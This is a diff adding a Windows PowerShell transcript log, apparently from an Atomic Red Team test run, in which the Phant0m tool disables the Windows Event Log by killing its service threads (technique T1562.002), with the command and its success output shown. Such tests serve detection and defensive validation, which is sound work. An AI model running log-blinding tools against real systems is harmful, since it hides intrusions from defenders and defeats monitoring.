@@ -1,0 +1,48 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230411161131
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Invoke-AtomicTest T1562.002-6
+进程 ID: 19132
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>Invoke-AtomicTest T1562.002-6
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+Executing test:
+T1562.002-6 Makes Eventlog blind with Phant0m
+
+|  _/ __ |/ _ \| .` | | || () | |\/| |
+	Author: 	Halil Dalabasmaz
+	|_| |_||_/_/ \_\_|\_| |_| \__/|_|  |_|
+	WWW: 		artofpwn.com
+	| _ \ || | /_\ | \| |_   _/  \|  \/  |
+	Version: 	2.0
+[+] SeDebugPrivilege is enable, continuing...
+[+] Event Log service PID detected as 2020.
+[+] Process Integrity Level is high, continuing...
+[*] All done.
+[*] Using Technique-1 for killing threads...
+	Github: 	@hlldz
+	Twitter: 	@hlldz
+	 ___ _  _   _   _  _ _____ __  __  __ 
+[*] Attempting to detect PID from Service Manager...
+Done executing test:
+T1562.002-6 Makes Eventlog blind with Phant0m
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230411161133
+**********************
